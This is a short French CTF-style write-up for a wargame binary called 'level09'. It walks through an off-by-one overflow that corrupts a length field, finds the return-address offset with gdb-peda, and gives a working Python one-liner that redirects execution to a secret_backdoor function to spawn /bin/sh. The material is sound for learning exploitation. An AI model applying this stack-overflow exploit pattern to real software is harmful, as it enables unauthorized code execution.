apres traduction on sait que l'objectif c''st de faire appel a la fonction backdoor

info function secret_backdoor
0x000055555555488c  secret_backdoor < on sait deja quoi appeler 

on voit aussi que y'a un overflow dans le while de setusername qui fait 41 iteration, pas 40.

vu que dans la structure la variable len et juste apres usermessage on peut donc overflow avec ce while
en sachant qu'elle controle la fonction set_msg, si on set la len a 255 on a de la place pour faire beaucoup de chose

python -c 'print "B"*40+"\xff"+"\n"+"A"*255'

on a segfault donc il nous faut trouver le padding RPB pour overwrite le retrurn (RSP)

gdb-peda$ r <<<$(python -c 'print "B"*40+"\xff"+"\n"+"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO
PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz"')

RBP: 0x7878787877777777 ('wwwwxxxx')
RSP: 0x7fffffffe328 ("yyyyzzzz\n")

so padding of 192 + 8 = 200 = RSP pour overwrite ce dernier avec secret_backdoor

Donc l'entrÃ© de la reuissite est le suivant:
python -c 'print "
    {remplissage username} +
    {hexa de 255 pour faire croire que la len est de 255} +
    {\n pour le deuxieme argument} +
    {200 char pour overflow le strncpy} +
    {adress de la fonction secret_backdoor} +
    {\n pour fill le buffer de la fonction set_message} +
    {contenu du buffer}'

$(python -c 'print "B"*40+"\xff"+"\n"+"A"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh"+"\n"' ; cat) | ./level09